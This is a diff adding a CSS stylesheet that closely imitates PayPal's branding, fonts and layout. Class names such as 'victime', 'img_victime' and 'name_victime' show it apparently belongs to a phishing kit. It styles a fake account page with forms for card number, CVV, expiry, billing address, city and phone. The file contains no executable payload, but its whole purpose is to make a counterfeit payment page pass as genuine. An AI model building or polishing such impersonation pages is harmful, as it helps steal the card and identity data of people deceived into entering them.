@@ -1,0 +1,1099 @@
+*
+{
+	box-sizing: border-box;
+}
+
+body
+{
+	margin: 0;
+	padding: 0;
+    font-size: inherit !important;
+    font-family: 'PayPal-Sans', sans-serif;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    background-color: #f5f7fa;
+    font-smoothing: antialiased;	
+}
+
+ul li
+{
+	list-style: none;
+}
+
+a
+{
+	text-decoration: none;
+}
+
+.nav_mobile
+{
+    padding: 10px 10px;
+    display: none;
+    min-height: 72px;
+    max-height: 84px;
+    border-bottom: 1px solid #0070ba;
+    background-color: #0070ba;
+    background-image: linear-gradient(100deg, #0070ba, #1546a0);
+    width: 100%;
+    overflow: hidden;
+}
+
+.nav_mobile .menu_m
+{
+	width: 37%;
+    float: left;
+    vertical-align: top;
+    padding-top: 16px;	
+}
+
+.nav_mobile .menu_m a
+{
+    text-decoration: none;
+    color: #fff;
+    border: 1px solid #fff;
+    padding: 10px;
+    font-weight: 500;
+    font-family: 'PayPal-Sans', sans-serif;
+    margin: 1.3rem 0 0 1rem;
+    border-radius: 1.5rem;
+    transition: all 250ms ease;
+    -webkit-font-smoothing: antialiased;
+    font-size: 0.9125rem;
+    line-height: 1.36363636;
+    min-width: 3.75rem;
+    padding: 0.46875rem 0.9375rem;
+    background-color: transparent;
+    font-weight: bold;	
+}
+
+.nav_mobile .logo_m
+{
+	vertical-align: top;
+    text-align: center;
+    width: 35%;
+    float: left;
+    padding-top: 8px;
+
+}
+
+.menu_desk
+{
+	padding: 10px 15px;
+    min-height: 72px;
+    max-height: 84px;
+    border-bottom: 1px solid #0070ba;
+    background-color: #0070ba;
+    background-image: linear-gradient(100deg, #0070ba, #1546a0);
+    width: 100%;
+    overflow: hidden;
+}
+
+.menu_desk .logo_d
+{
+	vertical-align: top;
+    text-align: center;
+    float: left;
+    padding-top: 11px;
+}
+
+.menu_desk .all_nav
+{
+    float: left;	
+}
+
+.menu_desk .all_nav .list_menu
+{
+    padding-left: 15px;
+}
+
+.menu_desk .all_nav .list_menu li
+{
+    display: inline-block;
+    vertical-align: top;
+    position: relative;
+    padding: 2px 1rem;
+    font-weight: 400;
+    text-transform: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    letter-spacing: 0.025em;
+    font-size: 0.9375rem;
+}
+
+.menu_desk .all_nav .list_menu li a
+{
+	text-decoration: none;
+    color: #ffffff;
+    display: block;
+    font-family: PayPal-Sans-Big, sans-serif;
+    font-weight: 400;
+    letter-spacing: 0.025rem;
+    font-size: 13px;
+}
+
+.setting
+{
+    /*width: 41%;*/
+    float: right;
+}
+
+.nav_mobile .netif_m
+{
+    float: right;
+    margin-top: 14px;
+    margin-right: 6px;
+}
+
+.setting li
+{
+    display: inline-block;
+    float: left;
+    padding-right: 40px;
+}
+
+.setting button
+{
+    border-radius: 1.5rem;
+    cursor: pointer;
+    transition: all 250ms ease;
+    -webkit-font-smoothing: antialiased;
+    font-size: 0.8125rem;
+    line-height: 1.36363636;
+    width: 83px;
+    background-color: transparent;
+    color: #ffffff;
+    border: 1px solid #fff;
+    padding-top: 5px;
+    padding-bottom: 5px;
+    margin-top: -6px;
+    font-weight: bold;
+}
+
+
+.victime
+{
+    padding-top: 20px;
+    background-color: #f5f7fa;
+    width: 960px;
+    margin: 0 auto;
+    overflow: hidden;
+}
+
+
+.victime .bil
+{
+    width: 50%;
+    overflow: hidden;	
+}
+
+.victime .bil .img_victime , .name_victime
+{
+	float: left;
+    padding-right: 35px;
+}
+
+.victime .bil .img_victime img
+{
+	border-radius: 50%;
+    border: 7px solid #0070ba;	
+}
+
+.victime .bil .name_victime p
+{
+	margin-bottom: 13px;
+    line-height: 1.2;
+    font-weight: 300;
+    text-transform: none;
+    font-family: 'PayPal-Sans-Big', sans-serif;
+    font-size: 28px;
+    letter-spacing: 0.025em;
+    white-space: normal;
+    cursor: pointer;
+    color: #2c2e2f;
+    margin-top: 24px;
+}
+
+.victime .bil .name_victime button
+{
+    display: inline-block;
+    margin-bottom: 1.5rem;
+    border-radius: 1.5rem;
+    font-family: 'PayPal-Sans', sans-serif;
+    text-align: center;
+    text-decoration: none;
+    cursor: pointer;
+    -webkit-font-smoothing: antialiased;
+    font-size: 0.8125rem;
+    line-height: 1.38461538;
+    min-width: 4.5rem;
+    padding: 0.5625rem 1.125rem;
+    box-sizing: border-box;
+    background-color: #ffffff;
+    color: #0070ba;
+    border: 1px solid #0070ba;
+    -moz-transition: all 0.4s ease-in-out;
+    -webkit-transition: all 0.4s ease-in-out;
+    -ms-transition: all 0.4s ease-in-out;
+    transition: all 0.4s ease-in-out;
+    font-weight: bold;	
+}
+
+.victime .bil .name_victime button span:hover
+{
+	border-bottom: 1px solid #0070ba;
+}
+
+.wrapp
+{
+    width: 960px;
+    margin: 0 auto;
+    overflow: hidden;
+}
+
+.wrapp .mony
+{
+    border: 1px solid #e0e0e0;
+    margin-top: 2em;
+    padding: 12px 20px 20px;
+    border-radius: 6px;
+    background-color: #ffffff;
+    box-shadow: none;
+    min-height: 1px;
+    padding-left: 1%;
+    padding-right: 1%;
+    font-size: 15px;
+    text-align: left;
+    width: 33%;
+    display: inline-block;      
+}
+
+.wrapp .mony .blance
+{
+    width: 100%;
+    overflow: hidden;
+    margin-bottom: 17px;
+}
+
+.wrapp .mony .blance .moustache
+{
+    padding-left: 5px;
+    color: #2c2e2f;
+    width: 50%;
+    overflow: hidden;
+    float: left;
+    font-size: 15px;
+    font-weight: bold;  
+}
+
+.wrapp .mony .blance .det
+{
+    width: 50%;
+    overflow: hidden;
+    float: right;
+    text-align: right;
+    padding-right: 15px;
+    color: #0070ba;
+    text-decoration: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    font-size: 15px;
+    font-weight: bold;
+}
+
+.wrapp .mony .blance a:hover
+{
+    text-decoration: underline;
+}
+
+.wrapp .mony .ch7al
+{
+    width: 88%;
+    overflow: hidden;
+    margin-bottom: 17px;
+    color: #2c2e2f;
+    padding-left: 5px;
+}
+
+/*.wrapp .mony .ch7al #anon
+{
+    direction: ltr;
+    unicode-bidi: embed;
+    font-size: 1.875rem;
+    line-height: 1.4;
+    font-weight: 300;
+    text-transform: none;
+    font-family: 'PayPal-Sans-Big', sans-serif;
+    -webkit-font-smoothing: antialiased;
+    color: #2c2e2f;
+    text-align: left;
+}*/
+
+.wrapp .mony .ch7al #anonisma
+{
+    white-space: pre-line;
+    font-size: 0.8125rem;
+    line-height: 1.38461538;
+    font-weight: 400;
+    text-transform: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    color: #6c7378;
+    letter-spacing: 0.05em;
+}
+
+.wrapp .mony ul
+{
+    padding-left: 5px;
+}
+
+.wrapp .mony ul li
+{
+    font-size: 0.8125rem;
+    line-height: 1.84615385;
+    font-weight: 400;
+    text-transform: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    letter-spacing: 0.025em;    
+    padding-bottom: 5px;
+}
+
+.wrapp .mony ul li a
+{
+    color: #0070ba;
+    text-decoration: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    font-weight: bold;
+}
+
+.wrapp .mony ul li a:hover
+{
+    text-decoration: underline;
+}
+
+.wrapp .wiz
+{
+    border: 1px solid #e0e0e0;
+    margin-top: 2em;
+    padding: 12px 20px 20px;
+    border-radius: 6px;
+    background-color: #ffffff;
+    box-shadow: none;
+    min-height: 1px;
+    padding-left: 1%;
+    padding-right: 1%;
+    font-size: 15px;
+    text-align: left;
+    width: 33%;
+}
+
+.wrapp .wiz .up
+{
+    width: 100%;
+    overflow: hidden;
+}
+
+.wrapp .wiz ul
+{
+    padding-left: 0px;
+    border-top: 1px solid #ccc;
+    padding-top: 10px;
+}
+
+.wrapp .wiz ul li
+{
+    width: 100%;
+    overflow: hidden;
+    position: relative;
+    margin-bottom: 13px;
+    margin-left: 17px;
+}
+
+.wrapp .wiz ul .active:before
+{
+    content: '';
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background-color: #0070ba;
+    float: left;
+    top: 5px;
+    position: absolute;
+}
+
+.wrapp .wiz ul .none:before
+{
+    content: '';
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    border: 1px solid #ccc;
+    float: left;
+    top: 5px;
+    position: absolute;
+}
+
+.wrapp .wiz ul .none a
+{
+    text-decoration: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    font-size: 13px;
+    font-weight: bold;
+    color: #e8e8e8;
+    padding-left: 20px;
+}
+
+.wrapp .wiz ul li a
+{
+    text-decoration: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    font-size: 13px;
+    font-weight: bold;
+    color: #292929;
+    padding-left: 20px;
+}
+
+.wrapp .wiz .im_cc
+{
+    background-position-y: 330px;
+    width: 48px;
+    height: 30px;
+    background-image: url(../img/car.png);
+    background-size: cover;
+    display: inline-block;
+}
+
+.wrapp .wiz .in_ccv
+{
+    position: relative;
+    top: -8px;
+}
+
+.wrapp .wiz .in_ccv .n_ccv , .wrapp .wiz .in_ccv .l_ccv
+{
+    color: #0070ba;
+    text-decoration: none;
+    font-weight: bold;
+    font-size: 0.8125rem;
+    line-height: 1.84615385;
+    text-transform: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    letter-spacing: 0.025em;
+}
+
+.wrapp .wiz .in_ccv .n_ccv
+{
+    padding-left: 10px;
+}
+
+.add
+{
+    width: 100%;
+    overflow: hidden;
+    padding-left: 7px;
+    border-top: 1px dotted #b7bcbf;
+    padding-top: 15px;
+}
+
+.add i
+{
+    width: 18px;
+    height: 18px;
+    color: #0070ba;
+    font-size: 20px;
+}
+
+.add #wiz
+{
+    padding-left: 5px;
+    display: table-cell;
+    vertical-align: middle;
+    color: #0070ba;
+    text-decoration: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    font-weight: bold;
+    letter-spacing: 0.025em;
+}
+
+.wrapp .wiz .up .update
+{
+    padding-left: 5px;
+    color: #000;
+    overflow: hidden;
+    float: left;
+    font-size: 15px;
+    font-weight: bold;  
+}
+
+.wrapp .moustache_anonisma
+{
+    border: 1px solid #e0e0e0;
+    margin-top: 2em;
+    padding: 12px 20px 20px;
+    border-radius: 6px;
+    background-color: #ffffff;
+    box-shadow: none;
+    min-height: 1px;
+    padding-left: 1%;
+    padding-right: 1%;
+    font-size: 15px;
+    text-align: left;
+    width: 65%;
+    float: right;
+}
+
+.wrapp .moustache_anonisma .cash
+{
+    width: 100%;
+    overflow: hidden;
+    text-align: center;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa
+{
+    width: 90%;
+    overflow: hidden;
+    margin: 0 auto;
+    padding-top: 15px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #hassan 
+{
+    width: 80%;
+    float: left;
+    margin-right: 15px;
+    transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
+    border-radius: 5px;
+    box-shadow: none;
+    color: #333;
+    border: 1px solid #cee0eb;
+    background-color: #fff;
+    font-size: 0.9375rem;
+    line-height: 1.4em;
+    height: 35px;
+    padding-left: 10px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #an
+{
+    width: 36%;
+    float: left;
+    margin-right: 25px;
+    transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
+    border-radius: 5px;
+    box-shadow: none;
+    color: #333;
+    border: 1px solid #cee0eb;
+    background-color: #fff;
+    font-size: 0.9375rem;
+    line-height: 1.4em;
+    height: 35px;
+    padding-left: 10px;
+    margin-top: 15px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #dt
+{
+    width: 39%;
+    float: left;
+    margin-right: 25px;
+    transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
+    border-radius: 5px;
+    box-shadow: none;
+    color: #333;
+    border: 1px solid #cee0eb;
+    background-color: #fff;
+    font-size: 0.9375rem;
+    line-height: 1.4em;
+    height: 35px;
+    padding-left: 10px;
+    margin-top: 15px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #adr
+{
+    width: 53%; 
+    margin-top: 15px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #haj
+{
+    width: 28%;
+    float: left;
+    margin-right: 15px;
+    transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
+    border-radius: 5px;
+    box-shadow: none;
+    color: #333;
+    border: 1px solid #cee0eb;
+    background-color: #fff;
+    font-size: 0.9375rem;
+    line-height: 1.4em;
+    height: 35px;
+    padding-left: 10px;
+    margin-top: 15px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #city
+{
+    width: 35%;
+    float: left;
+    margin-right: 15px;
+    transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
+    border-radius: 5px;
+    box-shadow: none;
+    color: #333;
+    border: 1px solid #cee0eb;
+    background-color: #fff;
+    font-size: 0.9375rem;
+    line-height: 1.4em;
+    height: 35px;
+    padding-left: 10px;
+    margin-top: 15px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #select
+{
+    width: 50%;
+    float: left;
+    margin-right: 15px;
+    transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
+    border-radius: 5px;
+    box-shadow: none;
+    color: #333;
+    border: 1px solid #cee0eb;
+    background-color: #fff;
+    font-size: 0.9375rem;
+    line-height: 1.4em;
+    height: 35px;
+    padding-left: 10px;
+    margin-top: 15px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa #sbt
+{
+    -webkit-appearance: button;
+    display: inline-block;
+    margin-right: 0.75rem;
+    margin-bottom: 1.5rem;
+    border: 1px solid #0070ba;
+    border-radius: 1.5rem;
+    font-size: 0.9375rem;
+    line-height: 1.6;
+    font-family: 'PayPal-Sans', sans-serif;
+    text-align: center;
+    text-decoration: none;
+    cursor: pointer;
+    color: #ffffff;
+    background-color: #0070ba;
+    transition: all 250ms ease;
+    -webkit-font-smoothing: antialiased;
+    margin-top: 20px;
+    font-weight: bold;
+    width: 160px;
+    padding-top: 6px;
+    padding-bottom: 6px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa .upload_info
+{
+    width: 100%;
+    overflow: hidden;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa .upload_info  .hassan_majd input[type="tel"]
+{
+    display: block;
+    width: 95%;
+    padding: 11px 0 11px 12px;
+    border-radius: 3px;
+    border: 1px solid #ccc;
+    margin-bottom: 13px;
+    font-size: 15px;
+}
+
+.talgim
+{
+    text-align: center;
+    font-weight: bold;
+    color: #797979;
+    margin-bottom: 25px;
+    margin-top: 0;
+    font-size: 1.6rem;
+    padding-top: 20px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa .upload_info  .wiz_khalifa input[type="tel"]
+{
+    width: 46%;
+    padding: 11px 0 11px 12px;
+    border-radius: 3px;
+    border: 1px solid #ccc;
+    margin-bottom: 13px;
+    font-size: 15px;
+    float: left;
+    margin-right: 7px;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa .upload_info .array_3 input[type="tel"]
+{
+    width: 48%;
+    padding: 11px 0 11px 12px;
+    border-radius: 3px;
+    border: 1px solid #ccc;
+    margin-bottom: 13px;
+    font-size: 15px;
+    float: left;
+}
+
+.wrapp .moustache_anonisma .mia_khalifa .upload_info .dawzo
+{
+    width: 100%;
+    overflow: hidden;    
+}
+
+.wrapp .moustache_anonisma .mia_khalifa .upload_info .dawzo input
+{
+    -webkit-appearance: button;
+    display: inline-block;
+    margin-right: 0.75rem;
+    margin-bottom: 1.5rem;
+    border: 1px solid #0070ba;
+    border-radius: 1.5rem;
+    font-size: 0.9375rem;
+    line-height: 1.6;
+    font-family: 'PayPal-Sans', sans-serif;
+    text-align: center;
+    text-decoration: none;
+    cursor: pointer;
+    color: #ffffff;
+    background-color: #0070ba;
+    transition: all 250ms ease;
+    -webkit-font-smoothing: antialiased;
+    margin-top: 20px;
+    font-weight: bold;
+    width: 95%;
+    padding-top: 6px;
+    padding-bottom: 6px;
+}
+
+.billing
+{
+    width: 95%;
+    overflow: hidden;
+    border: 1px solid #ccc;
+    margin-top: 85px;
+    border-radius: 5px;
+    padding: 8px;
+    padding-bottom: 20px;
+}
+
+.billing p
+{
+    font-weight: bold;
+    color: #8c8c8c;
+}
+
+.billing .info
+{
+    font-size: 0.8125rem;
+    line-height: 1.38461538;
+    font-weight: 400;
+    text-transform: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    color: #6c7378;
+    letter-spacing: 0.05em;
+}
+
+.billing .info a
+{
+    color: #0070ba;
+    text-decoration: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    display: block;
+    padding-top: 10px;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+.billing .info a:hover
+{
+    text-decoration: underline;
+}
+
+
+footer
+{
+    width: 100%;
+    overflow: hidden;
+    background: #fff;
+    margin-top: 35px;
+    padding-top: 25px;
+}
+
+footer .lawal , .tani , .talat
+{
+    width: 960px;
+    margin: 0 auto;
+}
+
+footer .lawal
+{
+    padding-bottom: 20px;
+    border-bottom: 1px solid #ccc;
+}
+
+footer .lawal a
+{
+    color: #6c7378;
+    text-decoration: none;
+    text-transform: uppercase;
+    line-height: 1.6;
+    font-size: inherit !important;
+    font-family: 'PayPal-Sans', sans-serif;
+    padding-right: 25px;
+}
+
+footer .tani
+{
+    text-align: right;
+    padding-top: 20px;
+}
+
+footer .tani span , footer .tani a
+{
+    color: #9da3a6;
+    font-family: 'PayPal Sans Big', sans-serif;
+    letter-spacing: 0.05rem;
+    line-height: 1.6;
+    font-weight: 400;
+    text-transform: none;
+}
+
+footer .talat
+{
+    padding: 0.5em 10px 1em;
+    font-family: 'PayPal Sans Big', sans-serif;
+    letter-spacing: 0.05rem;
+    text-align: left;
+    font-size: 0.8125rem;
+    line-height: 1.5em;
+    color: #9da3a6;
+    text-shadow: 0 1px 1px #ffffff;
+}
+
+/****** Start Media Query ************/
+
+
+/****** Start Max Width === 1235px *****/
+
+@media (max-width: 1000px) and (min-width: 951px){
+
+    .setting
+    {
+        margin-top: -35px; 
+    }
+}
+
+
+/****** End Max Width === 1235px *****/
+
+
+/****** Start Max Width === 950px *****/
+
+@media (max-width: 950px) and (min-width: 801px){
+
+    .menu_desk
+    {
+        display: none;
+    }
+
+    .nav_mobile
+    {
+        display: block;
+    }
+
+    .wrapp .moustache_anonisma .mia_khalifa .upload_info {
+    width: 100%;
+    overflow: hidden;
+    padding-left: 15px;
+    }
+
+}
+
+
+/****** End Max Width === 950px *****/
+
+
+/****** Start Max Width === 800px *****/
+
+@media (max-width: 800px) and (min-width: 601px){
+
+    .menu_desk
+    {
+        display: none;
+    }
+
+    .nav_mobile
+    {
+        display: block;
+    }
+
+    .wrapp .mony , .wrapp .wiz
+    {
+        display: none;
+    }
+
+    .wrapp .moustache_anonisma
+    {
+        width: 100%;
+        overflow: hidden;
+    }
+
+    .wrapp .moustache_anonisma .mia_khalifa #an, .wrapp .moustache_anonisma .mia_khalifa #adr 
+     , .wrapp .moustache_anonisma .mia_khalifa #select
+    {
+    width: 25%;
+    float: left;
+    margin-right: 15px;
+    transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
+    border-radius: 5px;
+    box-shadow: none;
+    color: #333;
+    border: 1px solid #cee0eb;
+    background-color: #fff;
+    font-size: 0.9375rem;
+    line-height: 1.4em;
+    height: 35px;
+    padding-left: 10px;
+    }
+
+    #hassan
+    {
+          width: 45%;
+    }
+
+    .mia_khalifa .zp
+    {
+            width: 100%;
+    overflow: hidden;
+    }
+
+    .wrapp .moustache_anonisma .mia_khalifa #dt , .wrapp .moustache_anonisma .mia_khalifa #city
+    {
+        clear: both;
+        width: 25%;
+    }
+
+    .wrapp .moustache_anonisma .mia_khalifa #haj
+    {
+        width: 25%;
+        clear: both;
+    }
+
+
+
+    footer .lawal, .tani, .talat 
+    {
+    width: 100%;
+    margin: 0 auto;
+    }
+
+
+}
+
+/****** End Max Width === 800px *****/
+
+
+  /****** Start Max Width === 600px **********/
+
+
+@media (max-width: 600px) and (min-width: 300px){
+    
+    .menu_desk
+    {
+        display: none;
+    }
+
+    .nav_mobile
+    {
+        display: block;
+    }
+
+    .victime 
+    {
+    padding-top: 20px;
+    background-color: #f5f7fa;
+    width: 100%;
+    margin: 0 auto;
+    overflow: hidden;
+    }
+
+    .victime .bil 
+    {
+    width: 100%;
+    overflow: hidden;
+    }
+
+    .victime .bil .img_victime, .name_victime 
+    {
+    float: left;
+    padding-right: 26px;
+    }
+
+    .victime .bil .img_victime, .name_victime 
+    {
+    float: left;
+    padding-right: 26px;
+    }
+
+    .wrapp 
+    {
+    width: 100%;
+    margin: 0 auto;
+    overflow: hidden;
+    }
+
+    .wrapp .mony , .wrapp .wiz
+    {
+        display: none;
+    }
+
+    .wrapp .moustache_anonisma 
+    {
+    border: 1px solid #e0e0e0;
+    margin-top: 2em;
+    padding: 12px 20px 20px;
+    border-radius: 6px;
+    background-color: #ffffff;
+    box-shadow: none;
+    min-height: 1px;
+    padding-left: 1%;
+    padding-right: 1%;
+    font-size: 15px;
+    text-align: left;
+    width: 100%;
+    float: right;
+    }
+
+    .wrapp .moustache_anonisma .mia_khalifa .upload_info
+    {
+        padding-left: 0px;
+    }
+
+    .wrapp .moustache_anonisma .mia_khalifa .upload_info  .hassan_majd input[type="tel"] , .wrapp .moustache_anonisma .mia_khalifa .upload_info .array_3 input[type="tel"] , .wrapp .moustache_anonisma .mia_khalifa .upload_info  .wiz_khalifa input[type="tel"]
+    {
+        width: 97%;
+    }
+
+    footer .lawal, .tani, .talat 
+    {
+    width: 100%;
+    margin: 0 auto;
+    }
+
+}    
+
+    /**** End Nav *********/
+
+  /******  End Max Width === 600px **********/  
+
+/****** End Media Query ************/
+
+
